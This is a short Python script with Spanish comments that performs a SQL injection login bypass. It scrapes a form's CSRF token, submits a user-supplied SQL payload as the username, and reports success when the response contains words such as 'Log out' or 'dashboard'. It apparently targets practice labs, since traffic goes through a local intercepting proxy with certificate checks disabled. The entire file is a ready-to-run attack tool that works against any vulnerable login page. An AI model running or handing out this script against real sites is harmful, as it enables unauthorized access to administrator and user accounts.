import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')

    # Intenta buscar un input específico que tenga el token CSRF
    csrf_input = soup.find("input", {"name": "csrf"})  # Cambia "csrf" si el nombre es diferente en tu página

    if csrf_input:
        csrf = csrf_input.get('value')
        print(f"CSRF token encontrado: {csrf}")
        return csrf
    else:
        print("No se encontró el campo CSRF en la página.")
        return None

def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)

    # Si no se pudo obtener el token CSRF, terminar la ejecución
    if csrf is None:
        print("[-] No se pudo obtener el token CSRF.")
        return False

    data = {"csrf": csrf,
            "username": payload,
            "password": "randomtext"}

    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text

    # Lista de posibles mensajes que indican un inicio de sesión exitoso
    success_messages = ["Log out", "home", "hola", "bienvenido", "dashboard", "perfil", "inicio"]

    # Verifica si alguno de estos mensajes está presente en la respuesta
    if any(message in res for message in success_messages):
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()

    except IndexError:
        print('[-] Uso: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Ejemplo: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(1)

    s = requests.Session()
    if exploit_sqli(s, url, sqli_payload):
        print('[+] ¡SQL injection exitosa! Hemos iniciado sesión como el usuario administrador.')
    else:
        print('[-] SQL injection fallida.')
